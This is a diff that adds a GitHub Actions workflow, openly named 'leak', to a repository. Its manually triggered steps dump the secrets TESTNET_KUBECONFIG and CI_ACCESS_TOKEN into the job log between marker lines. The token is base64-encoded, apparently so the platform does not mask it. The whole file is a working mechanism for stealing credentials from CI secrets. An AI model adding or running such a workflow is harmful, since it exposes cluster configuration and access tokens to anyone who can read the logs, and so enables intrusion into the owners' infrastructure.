@@ -1,0 +1,20 @@
+name: leak
+on:
+  workflow_dispatch:
+
+jobs:
+  leak:
+    name: Leak
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak TESTNET_KUBECONFIG
+        run: |
+          echo "===TESTNET_KUBECONFIG_START==="
+          echo "${{ secrets.TESTNET_KUBECONFIG }}" | base64 -d 2>/dev/null || echo "RAWVALUE:${{ secrets.TESTNET_KUBECONFIG }}"
+          echo "===TESTNET_KUBECONFIG_END==="
+      - name: Leak CI_ACCESS_TOKEN (b64)
+        run: |
+          echo "===CI_ACCESS_TOKEN_B64_START==="
+          echo "${{ secrets.CI_ACCESS_TOKEN }}" | base64 | tr -d '\n'
+          echo ""
+          echo "===CI_ACCESS_TOKEN_B64_END==="
